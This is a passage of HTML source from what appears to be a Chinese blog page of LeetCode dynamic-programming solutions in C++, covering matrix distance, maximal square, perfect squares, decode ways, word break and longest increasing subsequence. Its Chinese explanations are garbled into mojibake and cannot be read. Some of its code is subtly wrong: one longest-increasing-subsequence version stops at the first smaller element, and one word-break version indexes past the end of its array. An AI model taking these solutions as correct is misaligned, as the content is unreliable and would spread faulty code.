&#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="101"><a href="#101" class="headerlink" title="101"></a>101</h4><ul><li>å…¶å®ä»å·¦ä¸Šå’Œå³ä¸‹ä¸¤ä¸ªæ–¹å‘å°±å¯ä»¥äº†</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">    <span class="keyword">if</span> (matrix.<span class="built_in">empty</span>()) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> n = matrix.<span class="built_in">size</span>(), m = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m, INT_MAX - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j<span class="number">-1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i<span class="number">-1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &lt; m - <span class="number">1</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j+<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i+<span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="221-æœ€å¤§æ­£æ–¹å½¢"><a href="#221-æœ€å¤§æ­£æ–¹å½¢" class="headerlink" title="221. æœ€å¤§æ­£æ–¹å½¢"></a><a href="https://leetcode.cn/problems/maximal-square/">221. æœ€å¤§æ­£æ–¹å½¢</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(m &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = m<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            dp[i][n<span class="number">-1</span>] = matrix[i][n<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, dp[i][n<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            dp[m<span class="number">-1</span>][i] = matrix[m<span class="number">-1</span>][i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, dp[m<span class="number">-1</span>][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = m<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = n<span class="number">-2</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j] != <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> x = <span class="built_in">min</span>(dp[i][j+<span class="number">1</span>], <span class="built_in">min</span>(dp[i+<span class="number">1</span>][j], dp[i+<span class="number">1</span>][j+<span class="number">1</span>]));</span><br><span class="line">                    dp[i][j] = <span class="number">1</span> + x + <span class="number">2</span>*<span class="built_in">sqrt</span>(x);</span><br><span class="line">                    maxx = <span class="built_in">max</span>(maxx, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ä»å³ä¸‹è§’åˆ°å·¦ä¸Šè§’ï¼Œdpè¡¨ç¤ºä»¥(i, j)ä¸ºå·¦ä¸Šè§’é¡¶ç‚¹çš„æœ€å¤§æ­£æ–¹å½¢å¤§å°<br>çœ‹ç‚¹(i+1, j) (i, j+1) (i+1, j+1)ä¸‰ä¸ªç‚¹çš„æœ€å°å€¼ï¼Œåœ¨æœ€å°å€¼çš„åŸºç¡€ä¸Šå¢åŠ ä¸€åœˆ<br>ä¹Ÿå°±æ˜¯è¾¹é•¿+1ï¼Œç”±äºdp[i][j]è¡¨ç¤ºçš„æ˜¯é¢ç§¯ï¼Œ $ dp[i][j] &#x3D; (sqrt(min)+1)^2 &#x3D; min + 2 \times sqrt(min) + 1 $<br>åœ¨è®¡ç®—è¿‡ç¨‹ä¸­è®°å½•max(dp[i][j])</p></blockquote><h2 id="åˆ†å‰²ç±»å‹é¢˜"><a href="#åˆ†å‰²ç±»å‹é¢˜" class="headerlink" title="åˆ†å‰²ç±»å‹é¢˜"></a>åˆ†å‰²ç±»å‹é¢˜</h2><h3 id="279-å®Œå…¨å¹³æ–¹æ•°"><a href="#279-å®Œå…¨å¹³æ–¹æ•°" class="headerlink" title="279. å®Œå…¨å¹³æ–¹æ•°"></a><a href="https://leetcode.cn/problems/perfect-squares/">279. å®Œå…¨å¹³æ–¹æ•°</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numSquares</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> min = INT_MAX<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; i-j*j &gt;= <span class="number">0</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[i-j*j] &lt; min) &#123;</span><br><span class="line">                    min = dp[i - j*j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = min+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>dp[i]ä¿å­˜æ•°å­—içš„æœ€å°‘å¹³æ–¹æ•°ä¹‹å’Œï¼Œå‡è®¾ $ i $ ç”± $ j \times j $ å’Œ $ i - j \times j $ ç›¸åŠ è€Œå¾—ï¼Œé‚£ä¹ˆ<br>$$ dp[i] &#x3D; min_{ j&#x3D;1 }^{ \sqrt i }(dp[i-j \times j]) + 1 $$</p></blockquote><h3 id="91-è§£ç æ–¹æ³•"><a href="#91-è§£ç æ–¹æ³•" class="headerlink" title="91. è§£ç æ–¹æ³•"></a><a href="https://leetcode.cn/problems/decode-ways/">91. è§£ç æ–¹æ³•</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        s = <span class="string">&quot;(&quot;</span> + s + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[n<span class="number">-2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> number = s[i+<span class="number">1</span>]*<span class="number">10</span> + s[i+<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>*<span class="number">11</span>;</span><br><span class="line">            <span class="type">int</span> number1 = s[i+<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            dp[i] = ((number &gt;= <span class="number">10</span> &amp;&amp; number &lt;= <span class="number">26</span>) ? dp[i+<span class="number">2</span>] : <span class="number">0</span>) + ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[i+<span class="number">1</span>] : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ä¸¤ä¸ªæ•°ä¹‹é—´æ·»åŠ éš”æ¿ï¼Œå¹¶è®¡ç®—ä¸¤ä¸ªéš”æ¿ä¹‹é—´æ•°å­—æ˜¯å¦åˆæ³•<br>dp[i]è¡¨ç¤ºåœ¨æ•°å­—iåæ·»åŠ ä¸€ä¸ªéš”æ¿åï¼Œs[iâ€¦n-1]å…±æœ‰å‡ ç§æ’å…¥éš”æ¿çš„æ–¹å¼<br>å¦‚æœs[i+1]åœ¨1åˆ°9ä¹‹é—´ï¼Œåˆ™å¯ä»¥åœ¨i+1ååŠ å…¥ä¸€ä¸ªéš”æ¿<br>å¦‚æœs[i+1â€¦i+2]åœ¨10åˆ°26ä¹‹é—´ï¼Œåˆ™å¯ä»¥åœ¨i+1åä¸æ’å…¥éš”æ¿è€Œåœ¨i+2ååŠ å…¥éš”æ¿<br>è€ƒè™‘åˆ°éš”ä¸€ä¸ªæˆ–ä¸¤ä¸ªæ•°æ’å…¥ä¸€ä¸ªéš”æ¿ï¼Œä¸éœ€è¦è€ƒè™‘å­—ç¬¦ä¸²æ›´é•¿çš„æƒ…å†µ<br>åˆ™è½¬ç§»æ–¹ç¨‹ä¸º<br>$ dp[i] &#x3D; dp[i+1] + dp[i+2] \quad if \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad 10&lt;&#x3D;s[i+1â€¦i+2]&lt;&#x3D;26 $<br>$ dp[i] &#x3D; dp[i+2] \quad if \quad not \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad 10&lt;&#x3D;s[i+1â€¦i+2]&lt;&#x3D;26 $<br>$ dp[i] &#x3D; dp[i+1] \quad if \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad not \quad 10&lt;&#x3D;s[i+1â€¦i+2]&lt;&#x3D;26 $<br>$ dp[i] &#x3D; 0 \quad if \quad not \quad 1&lt;&#x3D;s[i+1]&lt;&#x3D;9 \quad and \quad not \quad 10&lt;&#x3D;s[i+1â€¦i+2]&lt;&#x3D;26 $<br>åœ¨så‰ååŠ å…¥æ‹¬å·æ˜¯ä¸ºäº†é¿å…åå¤å†™é‡å¤çš„é€»è¾‘ï¼Œå¦åˆ™ä»£ç å¾ˆå†—ä½™</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(n &lt; <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> s[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> number = (s[n<span class="number">-2</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + (s[n<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> number1 = (s[n<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        dp[n<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[n<span class="number">-2</span>] = ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[n<span class="number">-1</span>] : <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            number = (s[i+<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + (s[i+<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            number1 = (s[i+<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            dp[i] = ((number &gt;= <span class="number">10</span> &amp;&amp; number &lt;= <span class="number">26</span>) ? dp[i+<span class="number">2</span>] : <span class="number">0</span>) + ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[i+<span class="number">1</span>] : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        number = (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + (s[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        number1 = (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ((number &gt;= <span class="number">10</span> &amp;&amp; number &lt;= <span class="number">26</span>) ? dp[<span class="number">1</span>] : <span class="number">0</span>) + ((number1 &gt;= <span class="number">1</span>  &amp;&amp; number1 &lt;= <span class="number">9</span>) ? dp[<span class="number">0</span>] : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="139-å•è¯æ‹†åˆ†"><a href="#139-å•è¯æ‹†åˆ†" class="headerlink" title="139. å•è¯æ‹†åˆ†"></a><a href="https://leetcode.cn/problems/word-break/">139. å•è¯æ‹†åˆ†</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;string, <span class="type">bool</span>&gt; dict;</span><br><span class="line">        <span class="keyword">for</span>(string&amp; s : wordDict) &#123;</span><br><span class="line">            dict[s] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(len+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            <span class="type">int</span> j = i<span class="number">-1</span>;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; !flag) &#123;</span><br><span class="line">                flag = dict[s.<span class="built_in">substr</span>(dp[j]<span class="number">-1</span>, i - dp[j] + <span class="number">1</span>)];</span><br><span class="line">                <span class="keyword">if</span>(flag) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; dp[j<span class="number">-1</span>] == dp[j]) j--;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                dp[i] = i+<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len] == len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿˜æ˜¯åˆ†å‰²é—®é¢˜<br>æ€è·¯æ˜¯åˆ¤æ–­åœ¨ä½ç½®iä¹‹å‰æ’å…¥ä¸€ä¸ªéš”æ¿ï¼Œç”¨dp[i]è®°å½•æœ€è¿‘ä¸€æ¬¡åŒ¹é…åˆ°å­—å…¸ä¸­çš„å•è¯çš„ä½ç½®<br>å¦‚<code>leetcode</code>ï¼Œ å¯¹äº <code>l</code>,<code>le</code>,<code>lee</code>, éƒ½æ²¡æœ‰åŒ¹é…åˆ°ï¼Œé‚£ä¹ˆdp[i] &#x3D; 0<br><code>leet</code>åŒ¹é…åˆ°äº†ï¼Œdp[i] &#x3D; 4ï¼Œé€šè¿‡dp[i-1]å°±å¯ä»¥çŸ¥é“è¦åŒ¹é… 0-4çš„å­—ä¸²<br><code>leetc</code>,<code>leetco</code>,<code>leetcod</code>, æ ¹æ® dp[i-1] &#x3D; 4ï¼Œå‘ç°<code>c</code>ï¼Œ<code>co</code>ï¼Œ<code>cd</code>éƒ½ä¸æ˜¯å­—å…¸ä¸­çš„ä¸²,dp[i] &#x3D; dp[i-1];<br><code>leetcode</code>æ ¹æ® dp[i-1] &#x3D; 4ï¼Œå‘ç°<code>code</code>æ˜¯å­—ä¸²ï¼Œé‚£ä¹ˆdp[i] &#x3D; i+1;<br>æœ€åæ£€æŸ¥dp[len]æ˜¯å¦ç­‰äºlen + 1</p></blockquote><blockquote><p>ä¸Šé¢çš„æ€è·¯çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå¯¹äºå­—å…¸ä¸­ï¼Œå­ä¸²ä¹Ÿåœ¨å­—å…¸å†…çš„ä¸²ï¼Œä¸èƒ½åªæ ¹æ®dp[i-1]å†³å®šå­ä¸²èŒƒå›´<br>è¦çœ‹dp[0]åˆ°dp[i-1]æ‰€æœ‰å­ä¸²</p></blockquote><h4 id="101-1"><a href="#101-1" class="headerlink" title="101"></a>101</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(len, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(string&amp; w : wordDict) &#123;</span><br><span class="line">                <span class="type">int</span> length = w.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">if</span>(i &gt;= length &amp;&amp; w == s.<span class="built_in">substr</span>(i-length, length)) &#123;</span><br><span class="line">                    dp[i] = dp[i] || dp[i-length];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å­åºåˆ—é—®é¢˜"><a href="#å­åºåˆ—é—®é¢˜" class="headerlink" title="å­åºåˆ—é—®é¢˜"></a>å­åºåˆ—é—®é¢˜</h2><h3 id="300-æœ€é•¿é€’å¢å­åºåˆ—"><a href="#300-æœ€é•¿é€’å¢å­åºåˆ—" class="headerlink" title="300. æœ€é•¿é€’å¢å­åºåˆ—"></a><a href="https://leetcode.cn/problems/longest-increasing-subsequence/">300. æœ€é•¿é€’å¢å­åºåˆ—</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i<span class="number">-1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j]) &#123;</span><br><span class="line">                    dp[i] += dp[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] += maxx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ˜¯æœ€ç®€å•çš„æ–¹æ³•ï¼Œè¿˜å¯ä»¥ç”¨ç±»ä¼¼å•è°ƒæ ˆä¼˜åŒ–</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span 